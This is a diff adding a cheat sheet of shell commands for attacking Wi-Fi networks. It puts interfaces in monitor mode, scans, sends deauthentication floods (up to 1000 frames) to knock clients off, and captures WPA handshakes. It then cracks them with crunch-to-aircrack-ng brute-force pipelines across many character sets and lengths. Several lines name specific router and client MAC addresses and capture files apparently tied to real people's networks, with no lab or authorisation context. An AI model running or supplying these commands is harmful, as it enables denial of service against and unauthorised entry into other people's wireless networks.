@@ -1,0 +1,263 @@
+📍 ==================================================
+📍 1️⃣ Scan for Wi-Fi Networks
+📍 ==================================================
+
+iwconfig
+
+airmon-ng start <Your_Interface>
+
+airodump-ng <Your_Interface>
+
+
+📍 ==================================================
+📍 2️⃣ Capture Handshake via Deauthentication
+📍 ==================================================
+
+airodump-ng -c <Channel> --bssid <Target_BSSID> -w <CAPTURE_FILE> <Your_Interface>
+
+airodump-ng -c 11 --bssid 14:09:DC:7A:34:D0 -w Ameer_Hamza123.cap wlan0mon
+
+
+
+airodump-ng -c <Channel> --bssid A8:CA:7B:55:94:B0 -w capture_yt.cap wlan0mon
+ 
+
+ 
+ 
+ 
+
+aireplay-ng --deauth 10 -a <Target_BSSID> -c <Client_MAC> <Your_Interface>
+
+
+aireplay-ng --deauth 10 -a 14:09:DC:7A:34:D0 -c 22:00:6A:3E:21:D4 wlan0mon
+
+
+airodump-ng -c 1 --bssid A8:CA:7B:55:94:B0 -w Personal.cap wlan0
+aireplay-ng --deauth 1000 -a 14:09:DC:7A:34:D0 -c E0:80:6B:C0:E4:12 wlan0
+
+
+
+airmon-ng stop <Your_Interface>
+					or
+sudo airodump-ng -c <Channel> --bssid <Target_BSSID> -w capture_file wlan0
+sudo airodump-ng -c 4 --bssid 38:54:9B:1C:CE:04 -w capture_file wlan0
+
+sudo airodump-ng -c <Channel> --bssid <Target_BSSID> -w capture_file wlan0
+
+
+
+
+
+For Check Handshake :
+ 
+aircrack-ng <Filename>.cap
+
+Find All Cap files : 
+ls *.cap
+
+
+
+For anywordlist : 
+sudo aircrack-ng -w /usr/share/dict/wordlist-probable.txt -b 90:FD:73:E9:B4:0B /root/handshake-90:FD:73:E9:B4:0B.cap
+
+
+
+
+📍 ==================================================
+📍 🔢 Numeric Only (0-9) 8–15 chars
+📍 ==================================================
+
+crunch 8 8 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_8.txt 2>&1 | tee ~/aircrack_numeric_8.log
+
+crunch 9 9 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_9.txt 2>&1 | tee ~/aircrack_numeric_9.log
+
+crunch 10 10 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_10.txt 2>&1 | tee ~/aircrack_numeric_10.log
+
+crunch 11 11 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_11.txt 2>&1 | tee ~/aircrack_numeric_11.log
+
+crunch 12 12 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_12.txt 2>&1 | tee ~/aircrack_numeric_12.log
+
+crunch 13 13 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_13.txt 2>&1 | tee ~/aircrack_numeric_13.log
+
+crunch 14 14 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_14.txt 2>&1 | tee ~/aircrack_numeric_14.log
+
+crunch 15 15 0123456789 | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_numeric_15.txt 2>&1 | tee ~/aircrack_numeric_15.log
+
+
+📍 ==================================================
+📍 🔠 Uppercase Only (A-Z) 8–15 chars
+📍 ==================================================
+crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_8.txt 2>&1 | tee ~/aircrack_upper_8.log
+
+crunch 9 9 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_9.txt 2>&1 | tee ~/aircrack_upper_9.log
+
+crunch 10 10 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_10.txt 2>&1 | tee ~/aircrack_upper_10.log
+
+crunch 11 11 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_11.txt 2>&1 | tee ~/aircrack_upper_11.log
+
+crunch 12 12 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_12.txt 2>&1 | tee ~/aircrack_upper_12.log
+
+crunch 13 13 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_13.txt 2>&1 | tee ~/aircrack_upper_13.log
+
+crunch 14 14 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_14.txt 2>&1 | tee ~/aircrack_upper_14.log
+
+crunch 15 15 ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_15.txt 2>&1 | tee ~/aircrack_upper_15.log
+
+
+
+📍 ==================================================
+📍 🔡 Lowercase Only (a-z) 8–15 chars
+📍 ==================================================
+
+crunch 8 8 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_8.txt 2>&1 | tee ~/aircrack_lower_8.log
+
+crunch 9 9 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_9.txt 2>&1 | tee ~/aircrack_lower_9.log
+
+crunch 10 10 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_10.txt 2>&1 | tee ~/aircrack_lower_10.log
+
+crunch 11 11 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_11.txt 2>&1 | tee ~/aircrack_lower_11.log
+
+crunch 12 12 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_12.txt 2>&1 | tee ~/aircrack_lower_12.log
+
+crunch 13 13 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_13.txt 2>&1 | tee ~/aircrack_lower_13.log
+
+crunch 14 14 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_14.txt 2>&1 | tee ~/aircrack_lower_14.log
+
+crunch 15 15 abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_15.txt 2>&1 | tee ~/aircrack_lower_15.log
+
+
+
+📍 ==================================================
+📍 🔀 Lowercase + Numeric (a-z + 0-9) 8–15 chars
+📍 ==================================================
+
+crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_8.txt 2>&1 | tee ~/aircrack_lower_num_8.log
+
+crunch 9 9 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_9.txt 2>&1 | tee ~/aircrack_lower_num_9.log
+
+crunch 10 10 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_10.txt 2>&1 | tee ~/aircrack_lower_num_10.log
+
+crunch 11 11 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_11.txt 2>&1 | tee ~/aircrack_lower_num_11.log
+
+crunch 12 12 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_12.txt 2>&1 | tee ~/aircrack_lower_num_12.log
+
+crunch 13 13 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_13.txt 2>&1 | tee ~/aircrack_lower_num_13.log
+
+crunch 14 14 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_14.txt 2>&1 | tee ~/aircrack_lower_num_14.log
+
+crunch 15 15 0123456789abcdefghijklmnopqrstuvwxyz | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_lower_num_15.txt 2>&1 | tee ~/aircrack_lower_num_15.log
+
+
+📍 ==================================================
+📍 🔀 First Letter Uppercase + Rest Lowercase + Numeric (8–15 chars)
+📍 ==================================================
+
+
+
+
+crunch 8 8 -t ?u??????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_8.txt 2>&1 | tee ~/aircrack_cap_lower_num_8.log
+
+crunch 9 9 -t ?u???????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_9.txt 2>&1 | tee ~/aircrack_cap_lower_num_9.log
+
+crunch 10 10 -t ?u????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_10.txt 2>&1 | tee ~/aircrack_cap_lower_num_10.log
+
+crunch 11 11 -t ?u?????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_11.txt 2>&1 | tee ~/aircrack_cap_lower_num_11.log
+
+crunch 12 12 -t ?u??????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_12.txt 2>&1 | tee ~/aircrack_cap_lower_num_12.log
+
+crunch 13 13 -t ?u???????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_13.txt 2>&1 | tee ~/aircrack_cap_lower_num_13.log
+
+crunch 14 14 -t ?u????????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_14.txt 2>&1 | tee ~/aircrack_cap_lower_num_14.log
+
+crunch 15 15 -t ?u?????????????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_cap_lower_num_15.txt 2>&1 | tee ~/aircrack_cap_lower_num_15.log
+
+
+
+📍 ==================================================
+📍 🔀 Uppercase + Numeric (A-Z + 0-9) 8–15 chars
+📍 ==================================================
+
+crunch 8 8 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_8.txt 2>&1 | tee ~/aircrack_upper_num_8.log
+
+crunch 9 9 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_9.txt 2>&1 | tee ~/aircrack_upper_num_9.log
+
+crunch 10 10 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_10.txt 2>&1 | tee ~/aircrack_upper_num_10.log
+
+crunch 11 11 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_11.txt 2>&1 | tee ~/aircrack_upper_num_11.log
+
+crunch 12 12 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_12.txt 2>&1 | tee ~/aircrack_upper_num_12.log
+
+crunch 13 13 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_13.txt 2>&1 | tee ~/aircrack_upper_num_13.log
+
+crunch 14 14 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_14.txt 2>&1 | tee ~/aircrack_upper_num_14.log
+
+crunch 15 15 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_upper_num_15.txt 2>&1 | tee ~/aircrack_upper_num_15.log
+
+
+
+📍 ==================================================
+📍 🔀 Mixed Case + Numeric (a-z + A-Z + 0-9) 8–15 chars
+📍 ==================================================
+
+crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_8.txt 2>&1 | tee ~/aircrack_mixed_8.log
+
+crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_8.txt 2>&1 | tee ~/aircrack_mixed_8.log
+
+crunch 9 9 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_9.txt 2>&1 | tee ~/aircrack_mixed_9.log
+
+crunch 10 10 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_10.txt 2>&1 | tee ~/aircrack_mixed_10.log
+
+crunch 11 11 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_11.txt 2>&1 | tee ~/aircrack_mixed_11.log
+
+crunch 12 12 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_12.txt 2>&1 | tee ~/aircrack_mixed_12.log
+
+crunch 13 13 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_13.txt 2>&1 | tee ~/aircrack_mixed_13.log
+
+crunch 14 14 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mixed_14.txt 2>&1 | tee ~/aircrack_mixed_14.log
+
+
+Pattarn A-a-0:
+
+crunch 8 8 -t ?u?l?l?l?l?l?d?d | sudo aircrack-ng -w - -b <Target_BSSID> <CAPTURE_FILE>.cap -l ~/cracked_mask.txt 2>&1 | tee ~/aircrack_mask.log
+38:54:9B:1C:CE:04
+
+crunch 8 8 -t ?u?l?l?l?l?l?d?d | sudo aircrack-ng -w - -b 38:54:9B:1C:CE:04 capture_malik-01.cap -l ~/cracked_mask.txt 2>&1 | tee ~/aircrack_mask.log
+
+#Current :
+
+crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 38:54:9B:1C:CE:04 capture_malik-01.cap
+
+crunch 8 8 0123456789 | sudo aircrack-ng -w - -b 38:54:9B:1C:CE:04 capture_malik-01.cap -l ~/cracked_numeric_8.txt 2>&1 | tee ~/aircrack_numeric_8.log
+
+crunch 8 8 -t ?u??????? -f /usr/share/crunch/charset.lst lalpha-numeric | sudo aircrack-ng -w - -b 38:54:9B:1C:CE:04 capture_malik-01.cap -l ~/cracked_cap_lower_num_8.txt 2>&1 | tee ~/aircrack_cap_lower_num_8.log
+
+crunch 8 8 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 38:54:9B:1C:CE:04 capture_malik-01.cap
+
+
+
+
+
+
+
+
+
+
+
+
+📍 ==================================================
+📍 📝 Notes & Helping Words
+📍 ==================================================
+
+<Target_BSSID> → Router MAC Address
+
+<Your_Interface> → Your Wi-Fi adapter (e.g., wlan0)
+
+<CAPTURE_FILE> → Name for handshake capture file (e.g., handshake.cap)
+
+<Client_MAC> → MAC of connected client (optional, can be broadcast)
+
+Password cracking for long mixed passwords (12–15 chars) is extremely slow
+
+Use masks, dictionaries, or partial info for practical cracking
+
+All commands are dynamic; no pre-made text files needed
